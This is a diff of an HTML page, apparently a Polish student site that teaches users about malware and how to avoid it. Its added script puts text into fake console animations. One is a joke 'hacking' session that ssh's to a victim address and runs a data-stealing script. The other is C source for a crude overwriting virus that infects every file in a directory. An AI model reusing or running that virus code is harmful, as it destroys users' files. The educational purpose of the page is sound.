@@ -31,10 +31,10 @@
 
     <article class="powitanie">
       <header>
-        <h2>?No nasza strona jest o? Bonalski to jest twoje zad!</h2>
+        <h2>Witajcie użytkownicy! Na naszej, jakże zacnej stronie.</h2>
       </header>
       <div class="powitalny_content">
-        ???? ?????? ?? ????? ??????? ???? ? ?????????? ????, ??????? ?????????? ??????? ?????? ?????? ???????? ? ?????????. ??????? ??????? ??? ????? ??????????? ? ???? ????? ????? ?????? ?? ?? ????????.
+        Zabierzemy was dzisiaj we wspaniałą podróż, w trakcie której nauczycie się jak uchronić się przed różnymi zagrożeniami w sieci. Poznacie także różne typy programów, których musicie się wystrzegać, jak się one rozprzestrzeniają, oraz jak ich uniknąć. Jeśli jesteście ciekawscy, możecie się także dowiedzieć czegoś o nas…
       </div>
       <div class="guziki_box">
         <button class="guzik menu-trigger">Menu</button>
@@ -43,11 +43,8 @@
         <nav id="nav">
           <div class="container">
             <button><a href="#">Wprowadzenie</a></button>
-            <button><a href="#">Press me</a></button>
-            <button><a href="#">Press me</a></button>
-            <button><a href="#">Press me</a></button>
-            <button><a href="#">Press me</a></button>
-            <button><a href="#">Press me</a></button>
+            <button><a href="#">Rozmnarzanie</a></button>
+            <button><a href="#">Protekcja</a></button>
           </div>
         </nav>
       </div>
@@ -84,7 +81,7 @@
     </article>
     <article class="example">
       <div class="console">
-        <pre class="typing">~ </pre>
+        <pre class="typing typing1">~ </pre>
       </div>
     </article>
   </section>
@@ -92,7 +89,7 @@
   <section class="section_second">
     <article class="demo">
       <div class="console">
-        <pre class="typing"></pre>
+        <pre class="typing typing2"></pre>
       </div>
     </article>
     <article class="powitanie">
@@ -108,8 +105,21 @@
     </article>
   </section>
 
-  <section>
-
+  <section class="section-thirt">
+    <article class="powitanie">
+      <header>
+        <h2>Jak unikać złośliwego oprogramowania</h2>
+      </header>
+      <div class="powitalny_content">
+        Żeby unikną zarażenia takim programem przedewszystkim nie nalezy wymieniac sie miedzy soba pendriwami poniewarz mozna zarazic w ten sposob swoj jub kogos komputer. pozostale Pro tipy to...
+      </div>
+      <div class="dalej">
+        <a href="zabezpieczyc.html">Przejć dalej &raquo;</a>
+      </div>
+    </article>
+    <article class="kaluza-box">
+      <div class="kaluza"></div>
+    </article>
   </section>
 
   <footer>
@@ -124,8 +134,12 @@
 
   <script>
     let myText = "ssh ofiara@104.91.8.45~ sudo su -~ Password: **********~ git clone git@gitlab.com:gitlab-org/steal-personal-data.git~ sh steal-personal-data.sh~ Haha wlasnie kradne dane osobowe~ Numer karty kredytowej~ Numery telefonu~ Kody do librusa~ Posty na facebook~ A teraz pobralem pieniadze~ I stan mojego konta wynosi 12.345.679 euro~ ~ (Od tworcow) To byly tylko zarty, nic takiego sie nie stalo~ CHYBA";
-    let typing = document.querySelector('.typing'),
-      curentIndex = 0;
+    let typing = document.querySelector('.typing1'),
+      pisanie = document.querySelector('.typing2')
+    curentIndex = 0,
+      teraIndex = 0,
+      nieI = 0;
+    let skrypt = '#include <stdio.h>#include <io.h>#include <dos.h>#include <dir.h>#include <conio.h>#include <time.h>FILE *virus, *host;int done, a = 0;unsigned long x;char buff[2048];struct ffblk ffblk;clock_t st, end;void main() {  st = clock();  clrscr();  done = findfirst("*.*", &ffblk, 0);  while (!done) {    virus = fopen(_argv[0], "rb");    host = fopen(ffblk.ff_name, "rb+");    if (host == NULL) goto next;    x = 89088;    printf("Infecting %s/n", ffblk.ff_name, a);    while (x > 2048) {      fread(buff, 2048, 1, virus);      fwrite(buff, 2048, 1, host);      x -= 2048;    }    fread(buff, x, 1, virus);    fwrite(buff, x, 1, host);    a++;    next: {      fcloseall();      done = findnext( &ffblk);    }  }  printf("DONE! (Total files Infected= %d)", a);  end = clock();  printf("TIME TAKEN=%f SEC/n", (end - st) / CLK_TCK);  getch();}';
 
     var startTyping = function(text) {
       var interval = setInterval(function() {
@@ -142,6 +156,36 @@
       }, 100);
     }
 
+    var startPisac = function() {
+      if (scrollY <= 1300 && scrollY >= 1000) {
+        if (skrypt.length > teraIndex) {
+          if (skrypt[teraIndex] == ";") {
+            pisanie.innerHTML += ";<br>";
+          } else if (skrypt[teraIndex] == "{") {
+            pisanie.innerHTML += "{<br>";
+          } else if (skrypt[teraIndex] == "}") {
+            pisanie.innerHTML += "}<br>";
+          } else if (skrypt[teraIndex] == "#") {
+            pisanie.innerHTML += "<br>#";
+          } else if (skrypt[teraIndex] == "F") {
+            pisanie.innerHTML += "<br>F";
+          } else {
+            pisanie.innerHTML += skrypt[teraIndex];
+          }
+          teraIndex++;
+        } else {
+          return
+        }
+        nieI++;
+        if (nieI >= 3) {
+          console.log("kon")
+          nieI = 0;
+          return
+        }
+        setTimeout(startPisac, 100);
+      }
+    }
+
     function juzJest() {
       if (scrollY >= 300) {
         clearInterval(startNow);
@@ -150,6 +194,7 @@
     }
 
     //var startNow = setInterval(juzJest, 200);
+    window.addEventListener("keydown", startPisac)
 
   </script>
 
